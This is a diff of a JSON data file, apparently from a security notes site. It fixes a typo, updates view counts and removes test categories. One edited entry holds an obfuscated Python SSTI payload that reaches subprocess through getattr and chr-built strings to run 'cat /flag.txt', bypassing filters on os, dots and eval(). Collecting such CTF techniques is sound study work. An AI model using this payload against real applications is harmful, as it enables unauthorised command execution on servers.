@@ -11,14 +11,15 @@
                 "web exploit"
             ],
             "url": "",
-            "description": "<h2><strong>Problem:</strong></h2>\r\n<ul>\r\n<li>\r\n<p><code>os</code> module is blocked.</p>\r\n</li>\r\n<li>\r\n<p><code>.</code> (dot) is restricted.</p>\r\n</li>\r\n<li>\r\n<p><code>eval()</code> is blocked.</p>\r\n</li>\r\n</ul>\r\n<h2><strong>Solution:</strong></h2>\r\n<p>Use <code>subprocess</code> dynamically to execute system commands.</p>\r\n<h3><strong>Payload:</strong></h3>\r\n<pre><code class=\"language-python\">getattr(__import__('subprocess'), 'check_output')(\r\n    [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)]\r\n).decode()\r\n</code></pre>\r\n<h3><strong>Breakdown:S</strong></h3>\r\n<ul>\r\n<li>\r\n<p><code>__import__('subprocess')</code> \u2192 Dynamically imports <code>subprocess</code>.</p>\r\n</li>\r\n<li>\r\n<p><code>getattr(..., 'check_output')</code> \u2192 Accesses <code>check_output</code> without using <code>.</code>.</p>\r\n</li>\r\n<li>\r\n<p><code>[chr(99)+chr(97)+chr(116), ...]</code> \u2192 Builds <code>['cat', '/flag.txt']</code> dynamically.</p>\r\n</li>\r\n<li>\r\n<p><code>.decode()</code> \u2192 Converts output from bytes to a readable string.</p>\r\n</li>\r\n</ul>\r\n<h2><strong>Usage:</strong></h2>\r\n<ul>\r\n<li>\r\n<p>Can be used in SSTI scenarios where <code>os</code> is blocked.</p>\r\n</li>\r\n<li>\r\n<p>Works if <code>subprocess</code> is accessible.</p>\r\n</li>\r\n<li>\r\n<p>Helps bypass filters that restrict <code>.</code> or direct function calls.</p>\r\n</li>\r\n</ul>\r\n<p>\u00a0</p>",
+            "description": "<h2><strong>Problem:</strong></h2>\r\n<ul>\r\n<li>\r\n<p><code>os</code> module is blocked.</p>\r\n</li>\r\n<li>\r\n<p><code>.</code> (dot) is restricted.</p>\r\n</li>\r\n<li>\r\n<p><code>eval()</code> is blocked.</p>\r\n</li>\r\n</ul>\r\n<h2><strong>Solution:</strong></h2>\r\n<p>Use <code>subprocess</code> dynamically to execute system commands.</p>\r\n<h3><strong>Payload:</strong></h3>\r\n<pre><code class=\"language-python\">getattr(__import__('subprocess'), 'check_output')(\r\n    [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)]\r\n).decode()\r\n</code></pre>\r\n<h3><strong>BreakdownS</strong></h3>\r\n<ul>\r\n<li>\r\n<p><code>__import__('subprocess')</code> \u2192 Dynamically imports <code>subprocess</code>.</p>\r\n</li>\r\n<li>\r\n<p><code>getattr(..., 'check_output')</code> \u2192 Accesses <code>check_output</code> without using <code>.</code>.</p>\r\n</li>\r\n<li>\r\n<p><code>[chr(99)+chr(97)+chr(116), ...]</code> \u2192 Builds <code>['cat', '/flag.txt']</code> dynamically.</p>\r\n</li>\r\n<li>\r\n<p><code>.decode()</code> \u2192 Converts output from bytes to a readable string.</p>\r\n</li>\r\n</ul>\r\n<h2><strong>Usage:</strong></h2>\r\n<ul>\r\n<li>\r\n<p>Can be used in SSTI scenarios where <code>os</code> is blocked.</p>\r\n</li>\r\n<li>\r\n<p>Works if <code>subprocess</code> is accessible.</p>\r\n</li>\r\n<li>\r\n<p>Helps bypass filters that restrict <code>.</code> or direct function calls.</p>\r\n</li>\r\n</ul>\r\n<p>\u00a0</p>",
             "file_path": null,
             "date_added": "2025-04-03T19:28:34.824372",
             "added_by": "Anonymous",
             "rating": 5.0,
             "ratings_count": 1,
-            "views": 5,
-            "description_html": "<h2><strong>Problem:</strong></h2>\r\n<ul>\r\n<li>\r\n<p><code>os</code> module is blocked.</p>\r\n</li>\r\n<li>\r\n<p><code>.</code> (dot) is restricted.</p>\r\n</li>\r\n<li>\r\n<p><code>eval()</code> is blocked.</p>\r\n</li>\r\n</ul>\r\n<h2><strong>Solution:</strong></h2>\r\n<p>Use <code>subprocess</code> dynamically to execute system commands.</p>\r\n<h3><strong>Payload:</strong></h3>\r\n<pre><code class=\"language-python\">getattr(__import__('subprocess'), 'check_output')(\r\n    [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)]\r\n).decode()\r\n</code></pre>\r\n<h3><strong>Breakdown:S</strong></h3>\r\n<ul>\r\n<li>\r\n<p><code>__import__('subprocess')</code> \u2192 Dynamically imports <code>subprocess</code>.</p>\r\n</li>\r\n<li>\r\n<p><code>getattr(..., 'check_output')</code> \u2192 Accesses <code>check_output</code> without using <code>.</code>.</p>\r\n</li>\r\n<li>\r\n<p><code>[chr(99)+chr(97)+chr(116), ...]</code> \u2192 Builds <code>['cat', '/flag.txt']</code> dynamically.</p>\r\n</li>\r\n<li>\r\n<p><code>.decode()</code> \u2192 Converts output from bytes to a readable string.</p>\r\n</li>\r\n</ul>\r\n<h2><strong>Usage:</strong></h2>\r\n<ul>\r\n<li>\r\n<p>Can be used in SSTI scenarios where <code>os</code> is blocked.</p>\r\n</li>\r\n<li>\r\n<p>Works if <code>subprocess</code> is accessible.</p>\r\n</li>\r\n<li>\r\n<p>Helps bypass filters that restrict <code>.</code> or direct function calls.</p>\r\n</li>\r\n</ul>\r\n<p>\u00a0</p>"
+            "views": 15,
+            "description_html": "<h2><strong>Problem:</strong></h2>\r\n<ul>\r\n<li>\r\n<p><code>os</code> module is blocked.</p>\r\n</li>\r\n<li>\r\n<p><code>.</code> (dot) is restricted.</p>\r\n</li>\r\n<li>\r\n<p><code>eval()</code> is blocked.</p>\r\n</li>\r\n</ul>\r\n<h2><strong>Solution:</strong></h2>\r\n<p>Use <code>subprocess</code> dynamically to execute system commands.</p>\r\n<h3><strong>Payload:</strong></h3>\r\n<pre><code class=\"language-python\">getattr(__import__('subprocess'), 'check_output')(\r\n    [chr(99)+chr(97)+chr(116), chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)]\r\n).decode()\r\n</code></pre>\r\n<h3><strong>BreakdownS</strong></h3>\r\n<ul>\r\n<li>\r\n<p><code>__import__('subprocess')</code> \u2192 Dynamically imports <code>subprocess</code>.</p>\r\n</li>\r\n<li>\r\n<p><code>getattr(..., 'check_output')</code> \u2192 Accesses <code>check_output</code> without using <code>.</code>.</p>\r\n</li>\r\n<li>\r\n<p><code>[chr(99)+chr(97)+chr(116), ...]</code> \u2192 Builds <code>['cat', '/flag.txt']</code> dynamically.</p>\r\n</li>\r\n<li>\r\n<p><code>.decode()</code> \u2192 Converts output from bytes to a readable string.</p>\r\n</li>\r\n</ul>\r\n<h2><strong>Usage:</strong></h2>\r\n<ul>\r\n<li>\r\n<p>Can be used in SSTI scenarios where <code>os</code> is blocked.</p>\r\n</li>\r\n<li>\r\n<p>Works if <code>subprocess</code> is accessible.</p>\r\n</li>\r\n<li>\r\n<p>Helps bypass filters that restrict <code>.</code> or direct function calls.</p>\r\n</li>\r\n</ul>\r\n<p>\u00a0</p>",
+            "date_updated": "2025-04-17T00:40:10.249668"
         },
         {
             "id": 2,
@@ -55,7 +56,7 @@
             "added_by": "Anonymous",
             "rating": 0,
             "ratings_count": 0,
-            "views": 4,
+            "views": 5,
             "description_html": ""
         },
         {
@@ -333,24 +334,6 @@
             "name": "Kubernetes",
             "slug": "kubernetes",
             "icon": "fa-brands fa-hubspot"
-        },
-        {
-            "id": 12,
-            "name": "test",
-            "slug": "test",
-            "icon": "fas fa-book"
-        },
-        {
-            "id": 13,
-            "name": "test2",
-            "slug": "test2",
-            "icon": "fas fa-book"
-        },
-        {
-            "id": 14,
-            "name": "test3",
-            "slug": "test3",
-            "icon": "fas fa-book"
         }
     ]
 }
